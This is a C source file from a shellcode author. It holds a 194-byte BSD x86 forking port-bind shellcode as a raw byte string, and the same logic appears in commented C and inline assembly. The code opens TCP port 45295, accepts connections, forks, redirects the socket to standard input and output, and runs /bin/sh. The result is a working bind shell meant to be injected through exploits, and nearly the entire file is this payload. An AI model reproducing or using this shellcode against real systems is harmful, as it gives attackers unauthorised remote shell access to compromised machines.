/* BSD x86 shellcode by eSDee of Netric (www.netric.org)
 * 194 byte - forking portbind shellcode - port=0xb0ef(45295)
 */     

#include <stdio.h>

char
main[] =
        "\x31\xc0\x31\xdb\x53\xb3\x06\x53"
        "\xb3\x01\x53\xb3\x02\x53\x54\xb0"
        "\x61\xcd\x80\x89\xc7\x31\xc0\x50"
        "\x50\x50\x66\x68\xb0\xef\xb7\x02"
        "\x66\x53\x89\xe1\x31\xdb\xb3\x10"
        "\x53\x51\x57\x50\xb0\x68\xcd\x80"
        "\x31\xdb\x39\xc3\x74\x06\x31\xc0"
        "\xb0\x01\xcd\x80\x31\xc0\x50\x57"
        "\x50\xb0\x6a\xcd\x80\x31\xc0\x31"
        "\xdb\x50\x89\xe1\xb3\x01\x53\x89"
        "\xe2\x50\x51\x52\xb3\x14\x53\x50"
        "\xb0\x2e\xcd\x80\x31\xc0\x50\x50"
        "\x57\x50\xb0\x1e\xcd\x80\x89\xc6"
        "\x31\xc0\x31\xdb\xb0\x02\xcd\x80"
        "\x39\xc3\x75\x44\x31\xc0\x57\x50"
        "\xb0\x06\xcd\x80\x31\xc0\x50\x56"
        "\x50\xb0\x5a\xcd\x80\x31\xc0\x31"
        "\xdb\x43\x53\x56\x50\xb0\x5a\xcd"
        "\x80\x31\xc0\x43\x53\x56\x50\xb0"
        "\x5a\xcd\x80\x31\xc0\x50\x68\x2f"
        "\x2f\x73\x68\x68\x2f\x62\x69\x6e"
        "\x89\xe3\x50\x54\x53\x50\xb0\x3b"
        "\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\x56\x50\xb0\x06\xcd\x80"
        "\xeb\x9a";

int
c_code()
{
        char *argv[2];
        char *sockaddr =  "\x02\x00"             //  Address family
                          "\xb0\xef"             //  port
                          "\x00\x00\x00\x00"
                          "\x00\x00\x00\x00"
                          "\x00\x00\x00\x00";

        int sock        = 0;
        int new_sock    = 0;
        int a           = 16;

        sock = socket(2, 1, 6);
        if (bind(sock, sockaddr, 16) != 0) exit();
        listen(sock, 0);

        signal(20, 1);

        while(1) {

                new_sock = accept(sock, 0, 0);

                if (fork() == 0) {
                        close(sock);
                        dup2(new_sock, 0);
                        dup2(new_sock, 1);
                        dup2(new_sock, 2);
                        argv[0] = "//bin/sh";
                        argv[1] = NULL;
                        execve(argv[0], &argv[0], NULL);
                        exit();
                }

                close(new_sock);
        }

}


int
asm_code()
{
        __asm(" # sock = socket(2, 1, 6);
                xorl    %eax,   %eax
                xorl    %ebx,   %ebx
                pushl   %ebx
                movb    $6,     %bl             # IPPROTO_TCP
                pushl   %ebx
                movb    $1,     %bl             # SOCK_STREAM
                pushl   %ebx
                movb    $2,     %bl             # AF_INET
                pushl   %ebx
                pushl   %esp
                movb    $97,    %al             # SYS_socketcall
                int     $0x80           
                movl    %eax,   %edi            # sock

                # if (bind(sock, sockaddr, 16) != 0) exit();
                xorl    %eax,   %eax
                pushl   %eax
                pushl   %eax
                pushl   %eax
                pushw   $0xefb0                 # port
                movb    $02,    %bh             # Address family
                pushw   %bx
                movl    %esp,   %ecx
                xorl    %ebx,   %ebx
                movb    $16,    %bl
                pushl   %ebx
                pushl   %ecx
                pushl   %edi                    # sock
                pushl   %eax
                movb    $104,   %al             # SYS_bind
                int     $0x80
                xorl    %ebx,   %ebx
                cmpl    %eax,   %ebx
                je SKIP_EXIT
                xorl    %eax,   %eax
                movb    $1,     %al             # SYS_exit
                int     $0x80
                SKIP_EXIT:

                # listen(sock, 0);
                xorl    %eax,   %eax
                pushl   %eax
                pushl   %edi
                pushl   %eax
                movb    $106,   %al             # SYS_listen
                int     $0x80

                # signal(17, 1);
                # BSD doesn't have a signal syscall...
                xorl    %eax,   %eax
                xorl    %ebx,   %ebx
                pushl   %eax
                movl    %esp,   %ecx
                movb    $1,     %bl             # SIG_IGN       
                pushl   %ebx
                movl    %esp,   %edx
                pushl   %eax
                pushl   %ecx
                pushl   %edx
                movb    $20,    %bl             # SIG_CHLD
                pushl   %ebx
                pushl   %eax
                movb    $46,    %al             # SYS_sigaction
                int     $0x80

                # while(1);
                WHILE:
                        # new_sock = accept(sock, 0, 0);
                        xorl    %eax,   %eax
                        pushl   %eax
                        pushl   %eax    
                        pushl   %edi                    # sock
                        pushl   %eax
                        movb    $30,    %eax            # SYS_accept
                        int     $0x80
                        movl    %eax,   %esi            # new_sock

                        # if (fork() == 0)
                        xorl    %eax,   %eax
                        xorl    %ebx,   %ebx
                        movb    $2,     %al             # SYS_fork
                        int     $0x80
                        cmpl    %eax,   %ebx
                        jne CLOSE_NEWSOCK

                                # close(sock);
                                xorl    %eax,   %eax
                                pushl   %edi            # sock
                                pushl   %eax
                                movb    $6,     %al     # SYS_close
                                int     $0x80

                                # dup2(newsock, 0);
                                xorl    %eax,   %eax
                                pushl   %eax
                                pushl   %esi                    # new_sock

                                pushl   %eax                    # stdin
                                movb    $90,    %al             # dup2
                                int     $0x80

                                # dup2(newsock, 1);
                                xorl    %eax,   %eax
                                xorl    %ebx,   %ebx
                                incl    %ebx
                                pushl   %ebx                    # stdout
                                pushl   %esi                    # new_sock
                                pushl   %eax 
                                movb    $90,    %al             # dup2
                                int     $0x80

                                # dup2(newsock, 2);
                                xorl    %eax,   %eax
                                incl    %ebx
                                pushl   %ebx
                                pushl   %esi                    # new_sock
                                pushl   %eax                    # stderr
                                movb    $90,    %al             # dup2
                                int     $0x80

                                # execve(argv[0], &argv[0], NULL);
                                xorl    %eax,   %eax
                                pushl   %eax
                                pushl   $0x68732f2f
                                pushl   $0x6e69622f
                                movl    %esp,   %ebx
                                pushl   %eax
                                pushl   %esp
                                pushl   %ebx
                                pushl   %eax
                                movb    $59,    %al             # SYS_execve
                                int     $0x80                           

 
                                # exit()
                                xorl    %eax,   %eax
                                movb    $1,     %al             # SYS_exit
                                int     $0x80

                        CLOSE_NEWSOCK:
                        # close(new_sock);
                        xorl    %eax,   %eax
                        pushl   %esi                    # new_sock
                        pushl   %eax
                        movb    $6,     %al             # SYS_close
                        int     $0x80

                jmp     WHILE ");

}
